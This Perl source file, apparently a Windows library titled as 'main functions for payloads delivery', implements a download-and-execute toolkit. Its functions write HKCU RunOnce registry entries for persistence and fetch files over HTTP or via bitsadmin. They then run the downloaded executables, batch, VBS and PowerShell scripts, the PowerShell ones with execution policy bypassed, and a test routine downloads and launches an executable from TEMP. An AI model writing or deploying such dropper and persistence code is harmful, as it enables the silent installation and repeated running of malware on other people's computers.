#!C:\Strawberry\perl\bin\perl.exe -W
#**********************************************************
#
# Copyleft (L) New Internet Technologies Inc. 2021
#
# E-mail: vadimrevich21@gmail.com
#
# winlib.func1.0.0.pl
# This file contain main functions for payloads
# delivery at Strawberry Perl for Windows
#
# Locate: "C:\pub1\Distrib\LIB\LIB-Perl\winlib.func1.0.0.pl"
#
#**********************************************************

### Prepair System Settings
use strict;
use warnings;
use Data::Dumper;
use Win32::TieRegistry (Delimiter => '/');
use LWP::Simple;
### The End Of System Settings

#### Create locale Variables
my $strPath;
my $strWSHCmd;
my $strBATCmd;

#**********************************************************
#
# regKeyExists( $regkey )
# This Function Tests if key exist in Registry
#
# @param         $regkey         - Tested key in Registry
# @return         true if registry key exists, false otherwise
#               Probably Interrupts With Error
#
#**********************************************************
sub regKeyExists{
    my ($regkey) = @_;
    my $myKey;
    $myKey = $Registry ->{$regkey}
        or return 0;
    return 1;
};

#**********************************************************
#
# envExists( $envvar )
# This Function Tests if Environment Variable exists
#
# @param         $envvar         - Tested Variable at Environment
# @return         true if registry key exists, false otherwise
#               Probably Interrupts With Error
#
#**********************************************************
sub envExists {
    my ($envvar) = @_;
    my $myEnv;
    $myEnv = $ENV{ $envvar }
        or
            return 0;
    return 1;
};

#**********************************************************
#
# getTempEnviron()
# This Function Returns the Path for User Variable TEMP
#
# PARAMETERS:   NONE
# RETURNS:      Path For User Variable %TEMP% if Success
#               "C:\Windows\Temp" if API Error
#                "" if General System Error
#               Probably Interrupts With Error
#
#**********************************************************
sub getTempEnviron() {
    my $strvarTemp = "TEMP";
    if( &envExists( $strvarTemp ) == 0 ){
        print "TEMP Variable not Defined\n";
        return "";
    }
    else {
        return $ENV{ $strvarTemp };
    }
};

#**********************************************************
#
# CreateRunOnceWSHKey( $strPath, $strWSHCmd)
# This Function Creates a $strWSHCmd Key at the Registry Node
# with Value "wscript.exe //B //Nologo  ".strPath."\\".strWSHCmd
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# After overload it is run this command
# The Script No Run at Elevated Mode. Further the Rights can be Elevated.
#
# PARAMETERS:   $strPath -- The Path to strWSHCmd
#               $strWSHCmd -- a Script File with instructions
#               (Windows Script Shell)
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strWSHCmd not found
#               3 if System Damagesd
#               Probably Interrupts With Error
#
#**********************************************************
sub CreateRunOnceWSHKey {
    my ($strPath, $strWSHCmd) = @_;
    my $pathWScript;
    my $strRegNode = "HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce/";
    if( !regKeyExists($strRegNode)) {
        print "RunOnce Node is Absent. System Damage";
        return 3;
    }
    if( !envExists( "SystemRoot" )){
        print "SystemRoot variable Not Defined. System Damage.\n";
        return 3;
    }
    $pathWScript = $ENV{"SystemRoot"};
    $pathWScript = $pathWScript."\\System32\\wscript.exe";
    if( -f $pathWScript ){
        if( -d $strPath ){
            my $fullPathCmd = $strPath."\\".$strWSHCmd;
            if( -f $fullPathCmd ) {
                my $fullCommand = $pathWScript." //B //NoLogo ".$fullPathCmd;
                my $regNode = $Registry -> {$strRegNode};
                $regNode -> {'/'.$strWSHCmd} = $fullCommand;
                return 0;
            }
            else {
                print "File $fullPathCmd not found\n";
                return 2;
            }
        }
        else {
            print "Path $strPath is invalid.\n";
            return 1;
        }
    }
    else{
        print "WScript.exe file not found. System Damage \n";
        return 3;
    }
};


#**********************************************************
#
# CreateRunOnceBATKey( $strPath, $strBATCmd)
# This Function Creates a $strBATCmd Key at the Registry Node
# with Value "C:\Windows\sytem32\cmd.exe /c  ".strPath."\\".strBATCmd
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# After overload it is run this command
# The Script No Run at Elevated Mode. Further the Rights can be Elevated.
#
# PARAMETERS:   $strPath -- The Path to $strBATCmd
#               $strBATCmd-- a Script File with instructions
#               (Windows Command Shell)
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strWSHCmd not found
#               3 if System Damagesd
#               Probably Interrupts With Error
#
#**********************************************************
sub CreateRunOnceBATKey {
    my ($strPath, $strBATCmd) = @_;
    my $pathCmd;
    my $strRegNode = "HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce/";
    if( !regKeyExists($strRegNode)) {
        print "RunOnce Node is Absent. System Damage";
        return 3;
    }
    if( !envExists( "SystemRoot" )){
        print "SystemRoot variable Not Defined. System Damage.\n";
        return 3;
    }
    $pathCmd = $ENV{"SystemRoot"};
    $pathCmd = $pathCmd."\\System32\\cmd.exe";
    if( -f $pathCmd ){
        if( -d $strPath ){
            my $fullPathCmd = $strPath."\\".$strBATCmd;
            if( -f $fullPathCmd ) {
                my $fullCommand = $pathCmd." /c ".$fullPathCmd;
                my $regNode = $Registry -> {$strRegNode};
                $regNode -> {'/'.$strBATCmd} = $fullCommand;
                return 0;
            }
            else {
                print "File $fullPathCmd not found\n";
                return 2;
            }
        }
        else {
            print "Path $strPath is invalid.\n";
            return 1;
        }
    }
    else{
        print "WScript.exe file not found. System Damage \n";
        return 3;
    }
};


#**********************************************************
#
# UploadFilesFromInt( $strFile, $strURL, $strPath )
# This Function Upload the File $strFile from URL on HTTP/HTTPS Protocols
# and Save it on Local Computer to Path $strPath
#
# PARAMETERS:   $strFile -- a File to be Downloaded (only name and extension)
#               $strURL -- an URL of the web-site, from which the File
#               is Downloaded
#               $strPath -- a Place in a Windows Computer (Full path without slash)
#               in which the File is Downloaded
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strFile is Already Exist
#               3 if System Damagesd
#               4 if File Can't Download
#               Probably Interrupts With Error
#
#**********************************************************
sub UploadFilesFromInt {
    my ($strFile, $strURL, $strPath) = @_;
    if( -d $strPath ){
        my $fullPathCmd = $strPath."\\".$strFile;
        my $fullURL = $strURL.$strFile;
        if( -f $fullPathCmd ) {
            print "File $fullPathCmd is Already Exists";
            return 2;
        }
        else {
            getstore( $fullURL, $fullPathCmd );
            if ( -f $fullPathCmd ) {
                return 0;
            }
            else {
                print "File $strFile can\'t download\n";
                return 4;
            }
        }
    }
    else {
        print "Path $strPath is invalid.\n";
        return 1;
    }

};

#**********************************************************
#
# UploadFilesFromInt01( $strFile, $strURL, $strPath )
# This Function Upload the File $strFile from URL on HTTP/HTTPS Protocols
# and Save it on Local Computer to Path $strPath
# Function Uses "BitsAdmin.exe" Function for Load File
#
# PARAMETERS:   $strFile -- a File to be Downloaded (only name and extension)
#               $strURL -- an URL of the web-site, from which the File
#               is Downloaded
#               $strPath -- a Place in a Windows Computer (Full path without slash)
#               in which the File is Downloaded
#                $intTimeOut -- estimated Time for Download (ms)
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strVBS not found
#               3 if System Damagesd
#               4 if File Can't Download
#               Probably Interrupts With Error
#
#**********************************************************
sub UploadFilesFromInt01{
    my ($strFile, $strURL, $strPath) = @_;
    my $pathBits;
    if( !envExists( "SystemRoot" )){
        print "SystemRoot variable Not Defined. System Damage.\n";
        return 3;
    }
    $pathBits = $ENV{"SystemRoot"};
    $pathBits = $pathBits."\\System32\\bitsadmin.exe";
    if( -f $pathBits ){
        if( -d $strPath ){
            my $fullPathCmd = $strPath."\\".$strFile;
            my $fullURL = $strURL.$strFile;
            if( -f $fullPathCmd ) {
                print "File $fullPathCmd is Already Exists";
                return 2;
            }
            else {
                my $fullCommand = $pathBits." /Transfer FILE_TRANSFER /DOWNLOAD /Priority FOREGROUND ".$fullURL." \"".$fullPathCmd."\"";
                system( $fullCommand );
                if ( -f $fullPathCmd ) {
                    return 0;
                }
                else {
                    print "File $strFile can\'t download\n";
                    return 4;
                }
            }
        }
        else {
            print "Path $strPath is invalid.\n";
            return 1;
        }
    }
    else{
        print "WScript.exe file not found. System Damage \n";
        return 3;
    }
};

#**********************************************************
#
# RunDownloadWSH( $strPath, $strVBS, $intTimeOut )
# This Function Run a $strVBS File
# with Command "cscript //NoLogo ".$strPath."\\".$strVBS
#
#
# PARAMETERS:   $strPath -- The Path to strVBS
#               $strVBS -- a VBS File with instructions
#               (Windows Scripts Shell)
#               $intTimeOut -- Estimated Time for Running (ms)
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strVBS not found
#               3 if System Damagesd
#               Probably Interrupts With Error
#
#**********************************************************
sub RunDownloadWSH {
    my ($strPath, $strVBS) = @_;
    my $pathWScript;
    if( !envExists( "SystemRoot" )){
        print "SystemRoot variable Not Defined. System Damage.\n";
        return 3;
    }
    $pathWScript = $ENV{"SystemRoot"};
    $pathWScript = $pathWScript."\\System32\\cscript.exe";
    if( -f $pathWScript ){
        if( -d $strPath ){
            my $fullPathCmd = $strPath."\\".$strVBS;
            if( -f $fullPathCmd ) {
                my $fullCommand = $pathWScript." //NoLogo \"".$fullPathCmd."\"";
                system( $fullCommand );
                return 0;
            }
            else {
                print "File $fullPathCmd not found\n";
                return 2;
            }
        }
        else {
            print "Path $strPath is invalid.\n";
            return 1;
        }
    }
    else{
        print "WScript.exe file not found. System Damage \n";
        return 3;
    }
};
#**********************************************************
#
# RunDownloadBAT( $strPath, $strBAT, $intTimeOut )
# This Function Run a $strBAT File
# with Command "C:\Windows\System32\cmd.exe /c ".$strPath."\\".$strVBS
#
#
# PARAMETERS:   $strPath -- The Path to strBAT
#               $strBAT -- a Batch File with instructions
#               (Command Shell Scripts)
#                $intTimeOut -- Estimated Time for Running (ms)
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strVBS not found
#               3 if System Damagesd
#               Probably Interrupts With Error
#
#**********************************************************
sub RunDownloadBAT {
    my ($strPath, $strBAT) = @_;
    my $pathCmd;
    if( !envExists( "SystemRoot" )){
        print "SystemRoot variable Not Defined. System Damage.\n";
        return 3;
    }
    $pathCmd = $ENV{"SystemRoot"};
    $pathCmd = $pathCmd."\\System32\\cmd.exe";
    if( -f $pathCmd ){
        if( -d $strPath ){
            my $fullPathCmd = $strPath."\\".$strBAT;
            if( -f $fullPathCmd ) {
                my $fullCommand = $pathCmd." /c \"".$fullPathCmd."\"";
                system( $fullCommand );
                return 0;
            }
            else {
                print "File $fullPathCmd not found\n";
                return 2;
            }
        }
        else {
            print "Path $strPath is invalid.\n";
            return 1;
        }
    }
    else{
        print "cmd.exe file not found. System Damage \n";
        return 3;
    }
};

#**********************************************************
#
# RunDownloadExe( $strPath, $strEXE, $iTimeOut )
# This Function Run a strVBS File
# with Command $strPath."\\".strEXE
#
# PARAMETERS:   $strPath -- The Path to strEXE
#               $strEXE -- a Binary Execution File
#               $intTimeOut -- Estimated Time for Running (ms)
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strVBS not found
#               3 if System Damagesd
#               Probably Interrupts With Error
#
#**********************************************************
sub RunDownloadExe {
    my ($strPath, $strEXE) = @_;
    if( -d $strPath ){
        my $fullPathCmd = $strPath."\\".$strEXE;
        if( -f $fullPathCmd ) {
            my $fullCommand = "\"".$fullPathCmd."\"";
            system( $fullCommand );
            return 0;
        }
        else {
            print "File $fullPathCmd not found\n";
            return 2;
        }
    }
    else {
        print "Path $strPath is invalid.\n";
        return 1;
    }
};

#**********************************************************
#
# RunDownloadedPwsh( $strPath, $strPwsh, $intTimeOut )
# This Function Run a $strPwsh Powershell File
# with Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command ".$strPath."\\".$strPwsh
#
# PARAMETERS:   $strPath -- The Path to strPwsh
#               $strPwsh -- a PowerShell Script File with instructions
#               (Windows Powershell)
#               $intTimeOut -- Estimated Time for Running (ms)
#
# RETURNS:      0 if Success
#               1 if $strPath is Invalid
#               2 if $strVBS not found
#               3 if System Damagesd
#               Probably Interrupts With Error
#
#**********************************************************
sub RunDownloadedPwsh {
    my ($strPath, $strPwsh) = @_;
    my $pathPwsh;
    if( !envExists( "SystemRoot" )){
        print "SystemRoot variable Not Defined. System Damage.\n";
        return 3;
    }
    $pathPwsh = $ENV{"SystemRoot"};
    $pathPwsh = $pathPwsh."\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    if( -f $pathPwsh ){
        if( -d $strPath ){
            my $fullPathCmd = $strPath."\\".$strPwsh;
            if( -f $fullPathCmd ) {
                my $fullCommand = $pathPwsh." -ExecutionPolicy Bypass -Command \"".$fullPathCmd."\"";
                system( $fullCommand );
                return 0;
            }
            else {
                print "File $fullPathCmd not found\n";
                return 2;
            }
        }
        else {
            print "Path $strPath is invalid.\n";
            return 1;
        }
    }
    else{
        print "PowerShell.exe 2.0-5.0 file not found. System Damage \n";
        return 3;
    }
};

###
#
# Test Functions
#
###

#**********************************************************
#
# HelloWorld01Exec
# This is a Test Function for Checks Working a Library
#
# PARAMETERS:   NONE
#
# RETURNS:      NONE
#               Probably Interrupts With Error
#
#**********************************************************
sub HelloWorld01Exec {
    my( $strFile, $strPath, $strURL );
    $strFile = "HelloWorld01.exe";
    $strURL = "http://localhost:80/LIB/Exe/";
    $strPath = &getTempEnviron();
    if ( -d $strPath ){
        my $fullPathCmd = $strPath."\\".$strFile;
        if( -e $fullPathCmd ) {
            unlink($fullPathCmd)or die "Can't delete $fullPathCmd:  $!\n";
        }
        my $iRes = &UploadFilesFromInt( $strFile, $strURL, $strPath );
        if( $iRes == 0 ) {
            if( !&RunDownloadExe( $strPath, $strFile) ){
                print "Success Termination \n";
            }
            else {
                print "Error Executing File: $strFile\n";
            }
        }
        else {
            print "Error Downloading File: $strFile\n";
        }
    }
    else {
        print "Error: Temprorary Directory Not Defined";
    }
}

#**********************************************************
#
# envFuncTest()
# This is a Test Function for Checks Working a Library
#
# PARAMETERS:   NONE
#
# RETURNS:      NONE
#               Probably Interrupts With Error
#
#**********************************************************
sub envFuncTest()
{
    my $strRunOnce = "HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce";
    if( &regKeyExists( $strRunOnce ))
    {
        print $strRunOnce." Access allowed\n";
    }
    else
    {
        print $strRunOnce." Access denied\n";
    }
    $strRunOnce = "HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnc";
    if( &regKeyExists( $strRunOnce ))
    {
        print $strRunOnce." Access allowed\n";
    }
    else
    {
        print $strRunOnce." Access denied\n";
    }
    $strRunOnce = "HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/CurrentVersion/RunOnce";
    if( &regKeyExists( $strRunOnce ))
    {
        print $strRunOnce." Access allowed\n";
    }
    else
    {
        print $strRunOnce." Access denied\n";
    }
    $strRunOnce = "HKEY_CURRENT_USER/Environment/TEMP";
    if( &regKeyExists( $strRunOnce ))
    {
        print $strRunOnce." Access allowed\n";
    }
    else
    {
        print $strRunOnce." Access denied\n";
    }
    my $strSystemRoot = "SystemRoot";
    if( &envExists( $strSystemRoot ))
    {
        print $strSystemRoot." = $ENV{ $strSystemRoot }\n";
    }
    else
    {
        print $strSystemRoot." is not defined\n";
    }
    $strSystemRoot = "LEFT";
    if( &envExists( $strSystemRoot ))
    {
        print $strSystemRoot." = $ENV{ $strSystemRoot }\n";
    }
    else
    {
        print $strSystemRoot." is not defined\n";
    }
    my $temp = &getTempEnviron();
    print "Variable TEMP is \"$temp\"\n";
};

#**********************************************************
#
# showEnvFuncTest()
# This is a Test Function for Checks Working a Library
#
# PARAMETERS:   NONE
#
# RETURNS:      NONE
#               Probably Interrupts With Error
#
#**********************************************************
sub showEnvFuncTest {
    my $curEnv;
    foreach $curEnv ( %ENV ) {
        print "$curEnv\n";
    }
};

###
#
# Test Variables
#
###

#### CreateRunOnceWSHKey Test
#$strPath = "C:\\pub1\\Distrib\\LIB\\LIB-WSF";
#$strWSHCmd ="echo.wsf";
#&CreateRunOnceWSHKey( $strPath, $strWSHCmd );

#### CreateRunOnceBATKey Test
#$strPath = "C:\\pub1\\Distrib\\LIB\\BAT";
#$strBATCmd = "echo.bat";
#&CreateRunOnceBATKey( $strPath, $strBATCmd );

#### RunDownloadWSH Test
#$strPath = "C:\\pub1\\Distrib\\LIB\\LIB-WSF";
#$strWSHCmd ="echo.wsf";
#print $strWSHCmd."\n\n";
#&RunDownloadWSH( $strPath, $strWSHCmd );

#### RunDownloadExe Test
#$strPath = "C:\\pub1\\Distrib\\LIB\\Exe";
#$strWSHCmd = "HelloWorld01.exe";
#print $strWSHCmd."\n\n";
#&RunDownloadExe( $strPath, $strWSHCmd );

#### RunDownloadBAT Test
#$strPath = "C:\\pub1\\Distrib\\LIB\\BAT";
#$strWSHCmd ="echo.bat";
#print $strWSHCmd."\n\n";
#&RunDownloadBAT( $strPath, $strWSHCmd );

#### RunDownloPwsh Test
#$strPath = "C:\\pub1\\Distrib\\LIB\\LIB-PWSH";
#$strWSHCmd ="echo.ps1";
#print $strWSHCmd."\n\n";
#&RunDownloadedPwsh( $strPath, $strWSHCmd );

### Run Test Functions

#&showEnvFuncTest();
#&envFuncTest();
#&HelloWorld01Exec();